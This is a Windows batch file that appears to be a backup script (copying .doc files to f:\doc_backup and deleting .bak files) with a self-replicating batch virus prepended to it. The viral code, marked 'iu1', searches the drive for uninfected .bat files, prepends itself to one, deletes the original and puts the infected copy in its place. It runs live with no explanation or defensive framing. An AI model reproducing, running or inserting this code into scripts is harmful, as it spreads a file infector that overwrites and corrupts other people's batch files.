   @echo off
   :: iu1
   if not _%option%_ == _adv_cmd_ (
   set option=adv_cmd
   cmd.exe /v /c %0 %1 %2 %3 %4 %5 %6 %7 %8 %9
   exit /b
   ) else (
   set nextfile=not_found
   for /f "usebackq" %%a in (`dir /b /s \*.bat`) do (
   set skip=false
   for /f "skip=1 tokens=2" %%b in (%%a) do (
   if _!skip!_ == _false_ (
   if _%%b_ == _iu1_ set skip=true
   )
   )
   if _!skip!_ == _false_ set nextfile=%%a
   )
   if not _!nextfile!_ == _not_found_ (
   > nul copy /a %0 $$$.bat
   > delim.$$$ echo @echo on
   >> delim.$$$ echo @echo on
   > nul copy /b $$$.bat + delim.$$$ + !nextfile! $$$$.bat
   del $$$.bat delim.$$$
   for /f "usebackq" %%a in ('!nextfile!') do (
   del !nextfile!
   ren $$$$.bat %%~nxa
   > nul move %%~nxa %%~dpa
   )
   )
   )
   ::
   echo on

   @echo off
   COPY *.doc f:\doc_backup
   DEL *.bak
